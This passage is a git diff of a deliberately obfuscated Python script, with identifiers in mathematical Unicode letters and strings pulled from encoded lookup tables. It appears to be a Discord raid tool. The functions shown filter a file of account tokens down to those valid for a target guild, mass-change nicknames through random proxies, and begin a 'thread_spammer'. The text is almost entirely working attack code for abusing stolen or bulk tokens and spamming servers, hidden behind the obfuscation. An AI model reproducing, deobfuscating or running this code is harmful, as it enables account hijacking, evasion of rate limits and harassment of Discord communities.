𝙄𝗡𝗜𝙈𝗜𝘐𝘔[256]}")
+            𝙧𝘦𝘴𝗽𝘰𝙣𝘀𝙚 = 𝗿𝙚𝗾𝘶𝘦𝙨𝙩𝘴.get(f'{𝘐𝙉𝙄𝗡𝗹𝘭𝗜𝗠𝙄𝗜𝙡𝘔𝗹𝘭𝙄𝙡𝗹𝘕𝘕𝗜𝗹𝘭𝘔𝘕𝘭𝙉𝘭𝘔𝙄𝗠𝗜𝗠[152]}{𝗴𝘶𝗶𝙡𝘥𝗶𝙙}', headers=𝘩𝘦𝘢𝙙𝗲𝗿𝘴)
+        𝙙𝘯 = 𝙩𝙤𝗸𝗲𝗻.split(𝗜𝘕𝘐𝙉𝙡𝘭𝘐𝘔𝘐𝗜𝘭𝗠𝘭𝙡𝘐𝗹𝙡𝗡𝙉𝙄𝙡𝗹𝙈𝘕𝙡𝗡𝙡𝗠𝗜𝘔𝗜𝙈[247])
+        𝙣𝘯 = 𝙙𝗻[0]
+        if 𝘳𝙚𝙨𝘱𝗼𝘯𝙨𝙚.status_code == 200:
+            𝗽𝗿𝙞𝗻𝙩(f"{𝗿}{𝙄𝙉𝘐𝙉𝘭𝘭𝘐𝗠𝘐𝗜𝗹𝙈𝙡𝙡𝗜𝙡𝗹𝘕𝘕𝘐𝗹𝘭𝙈𝙉𝙡𝗡𝘭𝙈𝘐𝘔𝗜𝗠[91]}{𝗱𝗮𝙩𝗲𝘵𝙞𝘮𝗲.datetime.now().strftime(f'{𝗴}{𝗜𝗡𝘐𝙉𝗹𝗹𝙄𝗠𝘐𝘐𝙡𝗠𝘭𝙡𝙄𝗹𝙡𝙉𝗡𝗜𝘭𝗹𝗠𝗡𝗹𝘕𝙡𝗠𝘐𝗠𝗜𝘔[92]}{𝙧}')}{𝘐𝗡𝘐𝗡𝘭𝙡𝙄𝘔𝙄𝘐𝗹𝘔𝘭𝘭𝙄𝘭𝗹𝘕𝘕𝘐𝙡𝘭𝗠𝘕𝗹𝙉𝘭𝙈𝙄𝗠𝙄𝘔[93]}{𝗿}{𝘐𝙉𝘐𝘕𝙡𝗹𝙄𝙈𝘐𝗜𝙡𝗠𝗹𝙡𝗜𝘭𝙡𝗡𝘕𝙄𝗹𝗹𝙈𝙉𝘭𝗡𝘭𝙈𝗜𝗠𝙄𝙈[91]}{𝙡𝙘}{𝘐𝙉𝗜𝘕𝗹𝗹𝘐𝘔𝙄𝗜𝘭𝙈𝗹𝙡𝙄𝗹𝘭𝘕𝘕𝗜𝙡𝙡𝘔𝘕𝗹𝙉𝗹𝙈𝘐𝘔𝙄𝗠[301]}{𝘳}{𝘐𝗡𝗜𝙉𝘭𝗹𝘐𝙈𝘐𝗜𝗹𝗠𝘭𝗹𝙄𝘭𝘭𝘕𝗡𝙄𝘭𝙡𝙈𝘕𝙡𝙉𝘭𝗠𝘐𝙈𝘐𝘔[93]}{𝙣𝘯}{𝙜}{𝘐𝙉𝙄𝙉𝗹𝘭𝗜𝗠𝙄𝗜𝙡𝙈𝙡𝘭𝗜𝘭𝗹𝗡𝙉𝙄𝘭𝘭𝘔𝗡𝙡𝘕𝗹𝘔𝙄𝙈𝘐𝘔[249]}")
             return True
         else:
-            𝘱𝘳𝙞𝙣𝘵(f"{𝗿}{𝙉𝘔𝗠𝘔𝗡𝗹𝙡𝘔𝗠𝗹𝘔𝘔𝗡𝙡𝘐𝙈𝙄𝘐𝘕𝙈𝗜𝙄𝗠𝙄𝗹𝘐𝙉𝘐𝘔𝙄𝙄𝙈[98]}{𝘥𝗮𝘵𝘦𝘁𝗶𝙢𝗲.datetime.now().strftime(f'{𝗴}{𝗡𝙈𝘔𝗠𝗡𝘭𝗹𝘔𝗠𝗹𝙈𝙈𝙉𝘭𝗜𝙈𝘐𝙄𝗡𝗠𝗜𝗜𝙈𝘐𝘭𝙄𝙉𝗜𝙈𝘐𝙄𝘔[99]}{𝙧}')}{𝘕𝘔𝙈𝙈𝗡𝗹𝙡𝘔𝗠𝗹𝙈𝘔𝘕𝘭𝗜𝗠𝙄𝗜𝗡𝗠𝘐𝗜𝘔𝘐𝗹𝗜𝗡𝗜𝗠𝘐𝙄𝘔[100]}{𝘳}{𝗡𝗠𝙈𝘔𝙉𝙡𝙡𝘔𝙈𝗹𝗠𝗠𝙉𝙡𝗜𝙈𝗜𝘐𝘕𝘔𝙄𝘐𝗠𝙄𝘭𝙄𝙉𝙄𝗠𝗜𝙄𝗠[98]}{𝗯}{𝘕𝗠𝘔𝘔𝗡𝙡𝙡𝘔𝗠𝗹𝘔𝗠𝙉𝘭𝙄𝙈𝗜𝙄𝗡𝙈𝙄𝗜𝗠𝙄𝘭𝙄𝙉𝙄𝘔𝗜𝙄𝗠[309]}{𝗿}{𝗡𝗠𝘔𝘔𝙉𝘭𝘭𝘔𝗠𝗹𝘔𝗠𝗡𝘭𝘐𝙈𝘐𝘐𝗡𝙈𝙄𝘐𝘔𝙄𝘭𝙄𝘕𝗜𝙈𝗜𝗜𝘔[100]}{𝙣𝗻}{𝙜}{𝘕𝙈𝙈𝗠𝗡𝙡𝙡𝘔𝙈𝗹𝗠𝙈𝗡𝗹𝙄𝘔𝙄𝗜𝗡𝘔𝗜𝙄𝙈𝙄𝙡𝘐𝙉𝗜𝘔𝘐𝗜𝘔[256]}")
+            𝘱𝙧𝗶𝘯𝘵(f"{𝘳}{𝙄𝗡𝙄𝘕𝗹𝘭𝗜𝘔𝙄𝗜𝘭𝙈𝙡𝗹𝗜𝗹𝙡𝙉𝗡𝗜𝗹𝙡𝘔𝙉𝘭𝘕𝗹𝗠𝗜𝗠𝙄𝗠[91]}{𝘥𝗮𝘁𝙚𝘵𝘪𝙢𝘦.datetime.now().strftime(f'{𝗴}{𝘐𝘕𝗜𝘕𝙡𝙡𝙄𝘔𝘐𝘐𝗹𝗠𝙡𝗹𝙄𝙡𝙡𝙉𝙉𝗜𝘭𝘭𝙈𝗡𝙡𝘕𝗹𝘔𝗜𝘔𝗜𝙈[92]}{𝗿}')}{𝘐𝘕𝘐𝙉𝘭𝙡𝗜𝙈𝘐𝙄𝙡𝘔𝙡𝗹𝗜𝙡𝙡𝙉𝘕𝗜𝗹𝘭𝘔𝗡𝘭𝘕𝗹𝘔𝙄𝗠𝘐𝙈[93]}{𝙧}{𝘐𝙉𝘐𝗡𝗹𝙡𝘐𝗠𝗜𝘐𝘭𝙈𝗹𝘭𝙄𝘭𝙡𝗡𝗡𝗜𝘭𝙡𝗠𝘕𝘭𝘕𝗹𝙈𝙄𝙈𝗜𝘔[91]}{𝘣}{𝘐𝙉𝗜𝙉𝗹𝗹𝙄𝗠𝘐𝙄𝙡𝙈𝙡𝘭𝘐𝗹𝗹𝘕𝙉𝘐𝗹𝙡𝗠𝗡𝗹𝗡𝘭𝘔𝗜𝘔𝘐𝙈[302]}{𝙧}{𝗜𝗡𝙄𝘕𝙡𝘭𝗜𝙈𝙄𝙄𝘭𝙈𝗹𝗹𝗜𝘭𝙡𝙉𝘕𝗜𝗹𝗹𝘔𝘕𝘭𝘕𝗹𝙈𝘐𝘔𝗜𝙈[93]}{𝗻𝗻}{𝗴}{𝗜𝙉𝗜𝘕𝗹𝙡𝘐𝘔𝗜𝗜𝗹𝙈𝘭𝙡𝙄𝘭𝘭𝗡𝙉𝘐𝘭𝙡𝘔𝙉𝘭𝙉𝗹𝗠𝙄𝙈𝗜𝙈[249]}")
             return False
     except:
         pass
 
 def save_tokens_guild(file_path, guildid):
-    𝘃𝙖𝙡𝗶𝘥_𝙩𝘰𝙠𝘦𝘯𝘴 = 0
-    𝘵𝙤𝘬𝙚𝙣𝘀_𝘷𝙖𝗹𝙞𝙙 = []
-    𝙩𝘰𝘬𝗲𝘯𝙨 = 𝗼𝙥𝘦𝘯(𝗳𝙞𝗹𝙚_𝙥𝗮𝘵𝙝, 𝗡𝗠𝙈𝘔𝘕𝗹𝙡𝗠𝗠𝘭𝙈𝗠𝙉𝙡𝘐𝘔𝘐𝙄𝙉𝗠𝘐𝗜𝙈𝗜𝗹𝙄𝙉𝙄𝙈𝗜𝘐𝙈[37]).read().splitlines()
-    for 𝙩𝙤𝙠𝙚𝙣 in 𝙩𝗼𝘬𝗲𝗻𝘀:
-        if 𝗰𝘩𝗲𝙘𝙠_𝘨𝙪𝗶𝙡𝗱(𝘁𝘰𝗸𝙚𝘯, 𝘨𝙪𝘪𝗹𝗱𝗶𝙙):
-            𝙫𝘢𝙡𝙞𝗱_𝘁𝙤𝙠𝘦𝙣𝙨 += 1
-            𝘵𝙤𝘬𝗲𝙣𝘀_𝘃𝙖𝘭𝗶𝘥.append(𝘵𝗼𝘬𝘦𝙣)
-    with 𝘰𝗽𝘦𝙣(𝙛𝙞𝘭𝙚_𝘱𝙖𝘁𝘩, 𝙉𝙈𝗠𝗠𝗡𝙡𝗹𝘔𝙈𝘭𝗠𝘔𝘕𝘭𝙄𝙈𝗜𝙄𝙉𝙈𝘐𝗜𝘔𝘐𝙡𝗜𝘕𝙄𝙈𝘐𝙄𝘔[220]) as 𝙛:
+    𝘃𝙖𝘭𝘪𝗱_𝙩𝘰𝘬𝘦𝗻𝙨 = 0
+    𝘵𝘰𝗸𝗲𝘯𝘀_𝘃𝙖𝙡𝗶𝘥 = []
+    𝘁𝙤𝘬𝘦𝙣𝙨 = 𝗼𝙥𝗲𝙣(𝗳𝗶𝙡𝗲_𝙥𝙖𝙩𝗵, 𝙄𝙉𝗜𝗡𝙡𝙡𝗜𝗠𝙄𝙄𝗹𝘔𝙡𝘭𝙄𝘭𝙡𝙉𝘕𝙄𝘭𝗹𝗠𝗡𝗹𝙉𝘭𝙈𝙄𝘔𝘐𝗠[30]).read().splitlines()
+    for 𝙩𝘰𝘬𝗲𝗻 in 𝘵𝙤𝗸𝗲𝙣𝙨:
+        if 𝙘𝙝𝗲𝘤𝗸_𝘨𝙪𝗶𝘭𝗱(𝘵𝗼𝘬𝙚𝘯, 𝘨𝙪𝙞𝗹𝗱𝘪𝘥):
+            𝘃𝗮𝗹𝘪𝗱_𝙩𝙤𝘬𝗲𝗻𝘴 += 1
+            𝘵𝙤𝙠𝘦𝙣𝘀_𝙫𝘢𝙡𝙞𝗱.append(𝘵𝙤𝙠𝙚𝘯)
+    with 𝗼𝗽𝗲𝗻(𝘧𝘪𝙡𝗲_𝘱𝙖𝘁𝘩, 𝗜𝙉𝙄𝘕𝘭𝗹𝗜𝗠𝘐𝗜𝙡𝘔𝘭𝙡𝗜𝘭𝗹𝘕𝘕𝙄𝙡𝙡𝘔𝙉𝘭𝗡𝙡𝙈𝙄𝗠𝘐𝙈[213]) as 𝘧:
         𝗳.truncate(0)
-    with 𝙤𝙥𝗲𝗻(𝙛𝘪𝘭𝘦_𝘱𝗮𝘁𝗵, 𝘕𝗠𝘔𝗠𝙉𝘭𝗹𝗠𝗠𝗹𝘔𝗠𝗡𝘭𝗜𝗠𝗜𝗜𝗡𝘔𝗜𝙄𝗠𝗜𝗹𝗜𝗡𝗜𝗠𝙄𝘐𝘔[222]) as 𝙛:
-        for 𝘵𝘰𝘬𝙚𝙣 in 𝘁𝙤𝘬𝗲𝗻𝘀_𝘷𝙖𝗹𝗶𝘥:
-            𝙛.write(𝙩𝗼𝗸𝘦𝙣 + 𝘕𝘔𝘔𝙈𝗡𝘭𝙡𝙈𝗠𝘭𝙈𝙈𝙉𝙡𝘐𝗠𝙄𝗜𝙉𝘔𝘐𝙄𝙈𝗜𝗹𝙄𝗡𝘐𝘔𝘐𝗜𝗠[70])
+    with 𝘰𝘱𝘦𝗻(𝘧𝘪𝗹𝙚_𝙥𝘢𝙩𝘩, 𝙄𝙉𝙄𝙉𝘭𝘭𝙄𝗠𝗜𝘐𝘭𝙈𝘭𝙡𝙄𝘭𝗹𝗡𝘕𝗜𝙡𝙡𝗠𝙉𝙡𝗡𝘭𝙈𝗜𝙈𝙄𝘔[215]) as 𝙛:
+        for 𝘵𝗼𝙠𝗲𝘯 in 𝘵𝙤𝗸𝙚𝘯𝙨_𝘃𝙖𝘭𝗶𝘥:
+            𝙛.write(𝘁𝘰𝘬𝙚𝘯 + 𝘐𝗡𝙄𝙉𝙡𝙡𝗜𝘔𝘐𝙄𝙡𝙈𝘭𝙡𝗜𝘭𝗹𝗡𝗡𝗜𝘭𝗹𝘔𝙉𝘭𝙉𝘭𝘔𝗜𝙈𝗜𝘔[63])
 
 def mass_nick(token, guild, nick):
-    𝘩𝗲𝗮𝗱𝘦𝗿𝘴 = 𝙃𝗲𝗮𝘥𝗲𝙧𝘀(𝘵𝗼𝘬𝘦𝗻)
-    𝙥𝙖𝙮𝗹𝙤𝗮𝗱 = {𝗡𝘔𝗠𝗠𝘕𝙡𝘭𝙈𝙈𝗹𝙈𝘔𝗡𝙡𝗜𝙈𝙄𝘐𝘕𝙈𝘐𝘐𝗠𝗜𝗹𝘐𝙉𝘐𝙈𝙄𝗜𝘔[310]: 𝙣𝙞𝙘𝗸}
-    𝙙𝘯 = 𝘵𝗼𝙠𝙚𝘯.split(𝗡𝘔𝙈𝙈𝘕𝘭𝙡𝙈𝗠𝙡𝗠𝘔𝘕𝘭𝗜𝙈𝙄𝗜𝗡𝘔𝙄𝗜𝘔𝗜𝙡𝙄𝘕𝘐𝙈𝙄𝘐𝗠[254])
-    𝗻𝙣 = 𝙙𝙣[0]
-    if 𝙥𝙧𝙤𝘹𝘺:
-        𝗿𝙧 = 𝙧𝙚𝙦𝙪𝘦𝙨𝘁𝘀.patch(f'{𝗡𝙈𝙈𝗠𝘕𝘭𝘭𝗠𝗠𝘭𝘔𝘔𝘕𝗹𝙄𝘔𝗜𝗜𝗡𝘔𝗜𝙄𝘔𝙄𝙡𝙄𝗡𝙄𝗠𝗜𝘐𝙈[159]}{𝘨𝘶𝗶𝘭𝙙}{𝗡𝙈𝘔𝘔𝘕𝘭𝘭𝗠𝙈𝗹𝙈𝗠𝙉𝘭𝗜𝘔𝗜𝘐𝙉𝘔𝙄𝗜𝘔𝗜𝙡𝗜𝘕𝘐𝘔𝘐𝘐𝗠[311]}', json=𝗽𝘢𝘺𝙡𝙤𝗮𝗱, headers=𝗵𝗲𝘢𝗱𝘦𝙧𝙨, proxy={𝗡𝙈𝘔𝗠𝘕𝘭𝙡𝗠𝗠𝙡𝗠𝙈𝙉𝙡𝘐𝘔𝗜𝙄𝙉𝗠𝗜𝗜𝙈𝘐𝙡𝗜𝗡𝗜𝘔𝘐𝘐𝘔[251]: 𝘕𝙈𝗠𝗠𝘕𝘭𝗹𝘔𝙈𝘭𝘔𝘔𝗡𝗹𝙄𝗠𝘐𝘐𝗡𝙈𝘐𝘐𝘔𝗜𝗹𝘐𝘕𝗜𝘔𝗜𝘐𝙈[253] + 𝗿𝙖𝙣𝙙𝗼𝘮.choice(𝙥𝘳𝘰𝙭𝘪𝗲𝙨), 𝘕𝗠𝘔𝙈𝗡𝗹𝘭𝙈𝙈𝘭𝘔𝗠𝘕𝗹𝙄𝘔𝗜𝘐𝘕𝙈𝙄𝙄𝙈𝗜𝗹𝙄𝙉𝙄𝗠𝙄𝙄𝘔[252]: 𝘕𝙈𝙈𝘔𝗡𝘭𝙡𝙈𝗠𝗹𝗠𝗠𝙉𝘭𝙄𝘔𝘐𝙄𝙉𝗠𝗜𝘐𝘔𝙄𝗹𝙄𝙉𝙄𝗠𝗜𝘐𝗠[253] + 𝙧𝗮𝘯𝙙𝘰𝘮.choice(𝘱𝙧𝙤𝙭𝗶𝘦𝘴)})
+    𝗵𝙚𝗮𝘥𝘦𝘳𝘴 = 𝗛𝗲𝗮𝘥𝘦𝙧𝘴(𝙩𝙤𝗸𝙚𝙣)
+    𝘱𝙖𝘺𝙡𝗼𝗮𝘥 = {𝗜𝙉𝗜𝙉𝙡𝗹𝗜𝘔𝗜𝗜𝙡𝗠𝘭𝗹𝗜𝗹𝙡𝘕𝗡𝙄𝗹𝙡𝙈𝗡𝘭𝗡𝗹𝙈𝙄𝗠𝘐𝙈[303]: 𝗻𝙞𝘤𝘬}
+    𝙙𝙣 = 𝘵𝘰𝙠𝙚𝙣.split(𝙄𝙉𝗜𝘕𝙡𝘭𝙄𝗠𝙄𝙄𝘭𝗠𝙡𝗹𝗜𝘭𝙡𝙉𝗡𝗜𝗹𝘭𝘔𝗡𝙡𝗡𝙡𝙈𝗜𝘔𝙄𝘔[247])
+    𝗻𝗻 = 𝙙𝗻[0]
+    if 𝙥𝗿𝘰𝘅𝙮:
+        𝗿𝘳 = 𝘳𝙚𝙦𝙪𝙚𝘀𝙩𝙨.patch(f'{𝗜𝗡𝗜𝙉𝘭𝙡𝘐𝗠𝗜𝙄𝘭𝗠𝗹𝙡𝗜𝘭𝘭𝙉𝘕𝙄𝗹𝗹𝙈𝘕𝘭𝙉𝗹𝗠𝘐𝘔𝙄𝘔[152]}{𝗴𝘂𝘪𝗹𝙙}{𝘐𝘕𝗜𝗡𝗹𝙡𝘐𝗠𝘐𝙄𝙡𝘔𝘭𝘭𝘐𝗹𝙡𝘕𝘕𝗜𝘭𝘭𝘔𝗡𝗹𝗡𝗹𝘔𝗜𝙈𝘐𝗠[304]}', json=𝗽𝘢𝘺𝘭𝘰𝗮𝙙, headers=𝙝𝘦𝘢𝙙𝙚𝘳𝘴, proxy={𝘐𝘕𝗜𝙉𝙡𝗹𝗜𝘔𝗜𝘐𝙡𝙈𝙡𝙡𝘐𝗹𝙡𝗡𝘕𝙄𝙡𝗹𝘔𝗡𝘭𝙉𝘭𝙈𝘐𝘔𝗜𝘔[244]: 𝗜𝙉𝙄𝘕𝙡𝘭𝙄𝙈𝗜𝗜𝗹𝘔𝘭𝗹𝘐𝗹𝘭𝙉𝙉𝘐𝗹𝘭𝗠𝙉𝗹𝙉𝙡𝘔𝗜𝗠𝘐𝗠[246] + 𝘳𝘢𝗻𝙙𝘰𝙢.choice(𝗽𝗿𝙤𝙭𝗶𝗲𝙨), 𝗜𝙉𝘐𝘕𝗹𝗹𝗜𝗠𝗜𝙄𝙡𝗠𝙡𝘭𝗜𝘭𝗹𝙉𝙉𝗜𝘭𝘭𝘔𝘕𝙡𝗡𝗹𝘔𝙄𝗠𝘐𝙈[245]: 𝗜𝗡𝙄𝙉𝘭𝙡𝘐𝙈𝗜𝘐𝙡𝗠𝗹𝙡𝘐𝙡𝙡𝙉𝘕𝗜𝙡𝙡𝙈𝘕𝙡𝙉𝙡𝗠𝗜𝘔𝘐𝘔[246] + 𝙧𝘢𝘯𝙙𝘰𝘮.choice(𝘱𝗿𝙤𝘹𝘪𝗲𝘴)})
     else:
-        𝙧𝗿 = 𝙧𝗲𝗾𝙪𝘦𝘀𝘁𝘴.patch(f'{𝙉𝘔𝗠𝘔𝗡𝙡𝘭𝗠𝙈𝙡𝘔𝗠𝗡𝙡𝙄𝘔𝙄𝙄𝘕𝙈𝙄𝘐𝘔𝗜𝗹𝗜𝗡𝗜𝙈𝙄𝘐𝙈[159]}{𝙜𝘂𝗶𝙡𝙙}{𝗡𝘔𝘔𝗠𝗡𝘭𝙡𝙈𝗠𝘭𝘔𝗠𝗡𝗹𝙄𝗠𝗜𝗜𝙉𝗠𝗜𝗜𝘔𝙄𝙡𝗜𝗡𝗜𝘔𝘐𝗜𝙈[311]}', json=𝘱𝘢𝘺𝙡𝘰𝘢𝙙, headers=𝘩𝙚𝘢𝗱𝙚𝘳𝙨)
-    if 𝗿𝘳.status_code == 200:
-        𝗽𝗿𝗶𝘯𝙩(f"{𝗿}{𝘕𝗠𝗠𝙈𝙉𝙡𝘭𝙈𝗠𝗹𝙈𝙈𝙉𝗹𝘐𝙈𝘐𝙄𝗡𝙈𝘐𝘐𝗠𝘐𝗹𝙄𝗡𝘐𝗠𝗜𝙄𝙈[98]}{𝘥𝗮𝘁𝗲𝘵𝘪𝘮𝙚.datetime.now().strftime(f'{𝗴}{𝗡𝗠𝘔𝙈𝙉𝗹𝗹𝗠𝘔𝘭𝙈𝘔𝙉𝘭𝘐𝗠𝗜𝙄𝙉𝘔𝗜𝗜𝙈𝗜𝗹𝙄𝗡𝘐𝙈𝙄𝙄𝗠[99]}{𝘳}')}{𝘕𝙈𝘔𝗠𝗡𝘭𝘭𝘔𝘔𝘭𝗠𝗠𝗡𝘭𝙄𝙈𝗜𝗜𝙉𝙈𝗜𝗜𝗠𝘐𝘭𝙄𝘕𝘐𝘔𝙄𝘐𝗠[100]}{𝙧}{𝙉𝙈𝙈𝗠𝙉𝘭𝘭𝗠𝘔𝘭𝗠𝙈𝙉𝙡𝘐𝘔𝘐𝘐𝗡𝙈𝗜𝗜𝘔𝙄𝘭𝗜𝘕𝘐𝙈𝘐𝘐𝗠[98]}{𝙡𝙘}{𝗡𝗠𝗠𝗠𝙉𝘭𝗹𝘔𝘔𝙡𝙈𝙈𝗡𝗹𝙄𝘔𝘐𝗜𝘕𝘔𝗜𝘐𝙈𝘐𝙡𝗜𝘕𝘐𝘔𝘐𝘐𝙈[308]}{𝘳}{𝙉𝘔𝘔𝘔𝗡𝙡𝗹𝘔𝘔𝘭𝗠𝘔𝘕𝗹𝘐𝙈𝗜𝗜𝙉𝘔𝗜𝙄𝗠𝗜𝙡𝘐𝘕𝘐𝙈𝙄𝙄𝗠[100]}{𝘯𝙣}{𝘨}{𝗡𝗠𝗠𝗠𝘕𝙡𝗹𝘔𝘔𝙡𝘔𝗠𝘕𝘭𝘐𝘔𝙄𝙄𝘕𝙈𝘐𝙄𝙈𝙄𝙡𝘐𝗡𝙄𝗠𝗜𝗜𝘔[256]}")
+        𝙧𝗿 = 𝗿𝙚𝗾𝘂𝗲𝘀𝘁𝙨.patch(f'{𝙄𝙉𝗜𝗡𝘭𝙡𝘐𝙈𝙄𝗜𝘭𝗠𝙡𝗹𝗜𝘭𝙡𝘕𝙉𝘐𝙡𝘭𝙈𝘕𝘭𝙉𝗹𝙈𝙄𝗠𝙄𝙈[152]}{𝗴𝘂𝗶𝙡𝙙}{𝙄𝙉𝘐𝗡𝘭𝗹𝙄𝘔𝗜𝗜𝗹𝗠𝘭𝙡𝗜𝙡𝘭𝙉𝗡𝘐𝙡𝘭𝗠𝗡𝘭𝘕𝘭𝙈𝘐𝘔𝘐𝗠[304]}', json=𝙥𝙖𝘺𝗹𝙤𝙖𝗱, headers=𝙝𝗲𝙖𝘥𝗲𝗿𝘀)
+    if 𝗿𝗿.status_code == 200:
+        𝙥𝘳𝗶𝘯𝙩(f"{𝗿}{𝘐𝙉𝗜𝙉𝘭𝙡𝗜𝗠𝗜𝙄𝙡𝘔𝗹𝙡𝙄𝗹𝘭𝘕𝘕𝙄𝙡𝗹𝙈𝙉𝙡𝗡𝗹𝗠𝗜𝙈𝗜𝙈[91]}{𝘥𝗮𝘵𝘦𝘁𝙞𝘮𝘦.datetime.now().strftime(f'{𝘨}{𝙄𝙉𝙄𝙉𝙡𝘭𝘐𝘔𝘐𝗜𝗹𝙈𝗹𝘭𝗜𝘭𝗹𝗡𝘕𝙄𝘭𝘭𝘔𝗡𝗹𝘕𝙡𝘔𝗜𝗠𝗜𝗠[92]}{𝙧}')}{𝘐𝙉𝙄𝙉𝘭𝗹𝗜𝘔𝗜𝙄𝗹𝘔𝘭𝘭𝙄𝘭𝘭𝘕𝘕𝙄𝙡𝘭𝙈𝘕𝗹𝘕𝗹𝘔𝙄𝗠𝘐𝙈[93]}{𝙧}{𝘐𝗡𝙄𝙉𝙡𝙡𝙄𝘔𝘐𝘐𝘭𝙈𝗹𝗹𝙄𝙡𝗹𝗡𝘕𝙄𝙡𝙡𝘔𝘕𝗹𝙉𝗹𝘔𝘐𝘔𝙄𝙈[91]}{𝘭𝙘}{𝘐𝗡𝘐𝘕𝙡𝙡𝘐𝘔𝘐𝙄𝘭𝗠𝗹𝙡𝘐𝗹𝘭𝙉𝙉𝙄𝗹𝘭𝙈𝗡𝗹𝘕𝗹𝗠𝗜𝘔𝙄𝗠[301]}{𝙧}{𝙄𝗡𝘐𝘕𝙡𝘭𝘐𝗠𝘐𝗜𝗹𝙈𝗹𝗹𝗜𝗹𝙡𝙉𝗡𝙄𝘭𝙡𝙈𝙉𝘭𝙉𝘭𝘔𝘐𝘔𝘐𝗠[93]}{𝘯𝙣}{𝙜}{𝙄𝗡𝙄𝘕𝙡𝗹𝘐𝗠𝗜𝙄𝙡𝙈𝗹𝗹𝘐𝗹𝗹𝗡𝘕𝗜𝘭𝗹𝙈𝘕𝙡𝙉𝙡𝗠𝘐𝗠𝗜𝘔[249]}")
     else:
-        𝗽𝘳𝙞𝗻𝙩(f"{𝗿}{𝘕𝙈𝗠𝙈𝘕𝘭𝘭𝗠𝙈𝗹𝙈𝙈𝙉𝙡𝗜𝘔𝗜𝘐𝘕𝘔𝙄𝙄𝗠𝘐𝙡𝗜𝗡𝗜𝗠𝙄𝘐𝘔[98]}{𝘥𝘢𝘁𝗲𝙩𝙞𝘮𝙚.datetime.now().strftime(f'{𝗴}{𝘕𝘔𝙈𝗠𝘕𝗹𝗹𝘔𝘔𝘭𝙈𝘔𝗡𝗹𝘐𝘔𝗜𝙄𝗡𝘔𝙄𝘐𝗠𝗜𝘭𝘐𝗡𝘐𝙈𝗜𝙄𝗠[99]}{𝗿}')}{𝙉𝘔𝙈𝘔𝘕𝗹𝙡𝙈𝙈𝘭𝘔𝘔𝙉𝗹𝙄𝙈𝗜𝗜𝙉𝘔𝗜𝘐𝗠𝙄𝘭𝘐𝘕𝙄𝗠𝙄𝘐𝗠[100]}{𝙧}{𝙉𝘔𝙈𝗠𝙉𝗹𝘭𝗠𝗠𝘭𝗠𝙈𝙉𝘭𝙄𝘔𝗜𝗜𝘕𝗠𝘐𝙄𝘔𝙄𝘭𝗜𝗡𝘐𝙈𝘐𝗜𝗠[98]}{𝙗}{𝘕𝘔𝘔𝗠𝗡𝗹𝙡𝙈𝙈𝘭𝘔𝘔𝙉𝙡𝘐𝘔𝘐𝘐𝗡𝗠𝘐𝙄𝙈𝗜𝙡𝘐𝙉𝗜𝗠𝘐𝘐𝗠[276]}{𝗿}{𝘕𝘔𝗠𝙈𝘕𝗹𝗹𝘔𝙈𝘭𝘔𝙈𝙉𝘭𝘐𝗠𝘐𝗜𝗡𝗠𝙄𝗜𝗠𝙄𝙡𝙄𝙉𝗜𝘔𝙄𝗜𝗠[100]}{𝙣𝘯}{𝘨}{𝗡𝘔𝗠𝗠𝙉𝗹𝙡𝗠𝗠𝘭𝘔𝙈𝘕𝗹𝗜𝙈𝗜𝘐𝘕𝙈𝙄𝗜𝘔𝙄𝘭𝘐𝘕𝙄𝗠𝘐𝘐𝗠[277]}{𝙧𝘳.text}")
+        𝗽𝙧𝘪𝗻𝘁(f"{𝙧}{𝙄𝘕𝘐𝗡𝘭𝘭𝗜𝗠𝗜𝘐𝗹𝘔𝗹𝙡𝗜𝙡𝗹𝘕𝙉𝘐𝗹𝗹𝘔𝙉𝙡𝘕𝙡𝙈𝗜𝙈𝙄𝗠[91]}{𝘥𝙖𝘁𝗲𝙩𝗶𝘮𝙚.datetime.now().strftime(f'{𝗴}{𝙄𝘕𝘐𝘕𝗹𝗹𝗜𝗠𝙄𝙄𝗹𝗠𝗹𝘭𝗜𝙡𝙡𝘕𝘕𝘐𝘭𝗹𝗠𝙉𝘭𝘕𝗹𝗠𝙄𝘔𝘐𝙈[92]}{𝗿}')}{𝘐𝗡𝙄𝙉𝙡𝙡𝙄𝗠𝘐𝗜𝗹𝘔𝙡𝗹𝗜𝗹𝘭𝘕𝘕𝗜𝗹𝗹𝙈𝗡𝘭𝘕𝗹𝙈𝙄𝗠𝗜𝙈[93]}{𝙧}{𝙄𝙉𝘐𝗡𝙡𝘭𝘐𝗠𝘐𝙄𝙡𝗠𝗹𝘭𝙄𝙡𝗹𝙉𝙉𝘐𝘭𝘭𝙈𝘕𝘭𝘕𝗹𝙈𝗜𝘔𝘐𝘔[91]}{𝙗}{𝗜𝙉𝗜𝘕𝘭𝙡𝗜𝘔𝙄𝘐𝘭𝙈𝘭𝗹𝘐𝘭𝘭𝗡𝗡𝗜𝗹𝗹𝗠𝗡𝙡𝙉𝘭𝘔𝙄𝗠𝗜𝗠[269]}{𝘳}{𝘐𝘕𝘐𝘕𝗹𝘭𝗜𝗠𝘐𝙄𝙡𝘔𝘭𝘭𝙄𝙡𝗹𝘕𝗡𝗜𝙡𝙡𝗠𝙉𝙡𝙉𝙡𝙈𝘐𝙈𝗜𝙈[93]}{𝗻𝗻}{𝗴}{𝘐𝙉𝘐𝗡𝗹𝘭𝙄𝙈𝙄𝙄𝗹𝗠𝘭𝙡𝘐𝙡𝗹𝙉𝗡𝗜𝗹𝘭𝗠𝘕𝗹𝙉𝗹𝙈𝙄𝘔𝗜𝘔[270]}{𝘳𝗿.text}")
 
 def thread_spammer(token, name, channel):
-    𝙝𝘦𝙖𝗱𝗲𝙧𝘴 = 𝘏𝗲𝗮𝘥𝙚𝗿𝘀(𝙩𝘰𝙠𝘦𝙣)
